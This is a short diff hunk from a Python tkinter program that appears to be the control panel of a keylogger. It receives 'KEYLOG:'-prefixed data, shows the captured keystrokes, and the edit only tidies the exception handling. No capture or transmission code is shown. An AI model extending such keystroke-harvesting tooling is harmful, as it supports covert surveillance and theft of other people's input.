@@ -2333,8 +2333,7 @@ if __name__ == "__main__":
                             keystroke = data.replace("KEYLOG:", "")
                             self.keylog_text.insert(tk.END, keystroke)
                             self.keylog_text.see(tk.END)
-                        except:
-                            print(len(data))
+                        except Exception as e:
                             continue
                 except Exception as e:
                     self.log(f"Keylogger error: {e}")
